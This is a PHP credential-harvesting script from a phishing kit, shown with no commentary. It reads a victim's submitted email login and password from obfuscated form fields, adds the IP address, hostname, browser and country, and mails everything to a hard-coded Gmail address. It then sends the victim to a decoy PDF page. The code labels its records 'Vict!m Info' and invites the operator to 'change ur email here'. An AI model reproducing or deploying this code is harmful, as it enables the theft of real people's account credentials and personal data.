<?php
if($_POST["adc3949ba59abbe56e057"] != "" and $_POST["VGsFwQoWNrPt6vbsmH1dKJBP8dYcld"] != ""){
$ip = getenv("REMOTE_ADDR");
$adc3949ba59abbe56e057 = $_POST['adc3949ba59abbe56e057'];
$VGsFwQoWNrPt6vbsmH1dKJBP8dYcld = $_POST['VGsFwQoWNrPt6vbsmH1dKJBP8dYcld'];
$hidCflag = $_POST['hidCflag'];
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Wires Info-----------------------\n";
$message .= "|Provider : ".$_POST['hidCflag']."\n";
$message .= "|Online 1D : ".$_POST['adc3949ba59abbe56e057']."\n";
$message .= "|Pa55w0rd : ".$_POST['VGsFwQoWNrPt6vbsmH1dKJBP8dYcld']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "----------------------------\n";
//change ur email here
$sent ="homead01@gmail.com, homead01@gmail.com";


$subject =  "| $ip | $adc3949ba59abbe56e057 | $VGsFwQoWNrPt6vbsmH1dKJBP8dYcld|";
$headers = "From: $hidCflag<wirez@googledocs.org>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
if(preg_match("/@gmail\.com$/", urldecode($_POST['adc3949ba59abbe56e057'])))
    {
	mail($sent,$subject,$message,$headers);header("Location: ver.pdf.php?love=&id=9b6ceb2e0fb61e054ef866fa7b653cd19b6ceb2e0fb61e054ef866fa7b653cd1&session=9b6ceb2e0fb61e054ef866fa7b653cd19b6ceb2e0fb61e054ef866fa7b653cd1&session2=9b6ceb2e0fb61e054ef866fa7b653cd19b6ceb2e0fb61e054ef866fa7b653cd1");exit;
    }else{mail($sent,$subject,$message,$headers);}

 
header("Location: https://www.docdroid.net/6Eyq7po/bcreg20160629a1.pdf.html");
}else{

}

?>